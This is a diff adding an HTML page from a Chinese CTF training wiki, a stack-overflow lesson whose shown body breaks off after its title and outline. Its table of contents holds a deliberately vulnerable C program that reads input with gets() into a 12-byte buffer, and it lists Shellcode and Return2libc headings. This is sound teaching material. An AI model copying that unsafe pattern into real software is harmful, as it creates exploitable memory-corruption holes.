@@ -1,0 +1,1667 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../../%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%BB%BC%E5%90%88%E8%AE%AD%E7%BB%83/">
+      
+      
+        <link rel="next" href="../../%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">
+      
+      
+      <link rel="icon" href="../../../favicon.ico">
+      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.17">
+    
+    
+      
+        <title>栈溢出 - CUC CTF-Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.bcfcd587.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,700,700i%7CFira+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Fira Sans";--md-code-font:"Fira Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../_static/css/extra.css?v=12">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="CUC CTF-Wiki" class="md-header__button md-logo" aria-label="CUC CTF-Wiki" data-md-component="logo">
+      
+  <img src="../../../images/logo.jpg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CUC CTF-Wiki
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              栈溢出
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/cuccs/ctf-wiki" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    CUC CTF-Wiki
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="CUC CTF-Wiki" class="md-nav__button md-logo" aria-label="CUC CTF-Wiki" data-md-component="logo">
+      
+  <img src="../../../images/logo.jpg" alt="logo">
+
+    </a>
+    CUC CTF-Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/cuccs/ctf-wiki" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    CUC CTF-Wiki
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    首页
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            首页
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    主页
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../intro/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    关于本项目
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../FAQ/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    F.A.Q
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    MISC
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            MISC
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../MISC/intro/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    简介
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../MISC/MISC-2/MISC-2/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    信息搜集 && 编码
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../MISC/MISC-1/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81_%E9%9A%90%E5%86%99%E5%88%86%E6%9E%90/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    数字取证 && 隐写分析
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    CRYPTO
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            CRYPTO
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CRYPTO/intro/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    简介
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CRYPTO/%E7%AC%AC%E4%B8%89%E5%91%A8-Crypto/Crypto/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    古典密码、对称加密、非对称加密
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    WEB
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            WEB
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../WEB/intro/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    简介
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../WEB/WEB-1/XSS%28%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%29/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XSS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../WEB/WEB-2/Web%20PHP%20audit/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PHP audit
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../WEB/WEB-3/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    PWN
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            PWN
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../intro/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    简介
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    C语言前置基础(基础篇)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/C%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    C语言前置基础(进阶篇)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/Linux%E5%9F%BA%E7%A1%80%E5%8F%8A%E5%B7%A5%E5%85%B7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux前置基础及工具
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%BB%BC%E5%90%88%E8%AE%AD%E7%BB%83/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    格式化字符串漏洞
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    栈溢出
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    栈溢出
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      主讲人：卢玉洁
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      目录
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      缓冲区溢出
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#x86" class="md-nav__link">
+    <span class="md-ellipsis">
+      栈溢出原理介绍（X86)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      存储下一条指令地址/要执行指令的地址。
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="存储下一条指令地址/要执行指令的地址。">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      函数调用详细过程讲解
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example_1
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example_2
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#include-stdioh-include-stringh-void-success-putsyou-have-already-controlled-it-void-vulnerable-char-s12-getss-return-int-mainint-argc-char-argv-vulnerable-return-0" class="md-nav__link">
+    <span class="md-ellipsis">
+      # include &lt;stdio.h&gt; # include &lt;string.h&gt; void success(){ puts(&quot;You Have already controlled it.&quot;); } void vulnerable(){ char s[12]; gets(s); return; } int main(int argc, char **argv){ vulnerable(); return 0; }
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      栈溢出利用方法
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="栈溢出利用方法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#shellcode" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shellcode
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#return2libc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Return2libc
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      栈溢出入门题
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    整数溢出
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    REVERSE
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            REVERSE
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../REVERSE/intro/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    简介
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    集训安排
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            集训安排
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../training/2020Autumn/2020AutumnOutline/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    2020秋季集训
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../training/2022Autumn/%E7%A7%8B%E5%AD%A3%E5%9F%B9%E8%AE%AD%E5%A4%A7%E7%BA%B2/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    2022秋季集训
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../training/2025Spring/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    2025春季集训
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../training/2025Autumn/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    2025秋季集训
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      主讲人：卢玉洁
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      目录
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      缓冲区溢出
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#x86" class="md-nav__link">
+    <span class="md-ellipsis">
+      栈溢出原理介绍（X86)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      存储下一条指令地址/要执行指令的地址。
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="存储下一条指令地址/要执行指令的地址。">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      函数调用详细过程讲解
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example_1
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example_2
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#include-stdioh-include-stringh-void-success-putsyou-have-already-controlled-it-void-vulnerable-char-s12-getss-return-int-mainint-argc-char-argv-vulnerable-return-0" class="md-nav__link">
+    <span class="md-ellipsis">
+      # include &lt;stdio.h&gt; # include &lt;string.h&gt; void success(){ puts(&quot;You Have already controlled it.&quot;); } void vulnerable(){ char s[12]; gets(s); return; } int main(int argc, char **argv){ vulnerable(); return 0; }
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      栈溢出利用方法
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="栈溢出利用方法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#shellcode" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shellcode
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#return2libc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Return2libc
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      栈溢出入门题
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<style>
+/* Add "Page" prefix and total page number */
+section::after {
+  font-weight: bold;
+  content: '' attr(data-marpit-pagination) '/' attr(data-marpit-pagination-total);
+}
+</style>
+<!-- _class: lead gaia 
+paginate: true
+backgroundColor: white
+color: black
+-->
+<h1 id="_1">栈溢出<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h2 id="_2">主讲人：卢玉洁<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<!-- _backgroundColor: white -->
+
+<h2 id="_3">目录<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<ul>
+<li>栈溢出相关知识<ul>
+<li>缓冲区溢出简介</li>
+<li>栈溢出原理介绍</li>
+</ul>
+</li>
+<li>栈溢出入门题</li>
+</ul>
+<hr />
+<!--_class: lead gaia>
+-->
+<h2 id="_4">缓冲区溢出<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<hr />
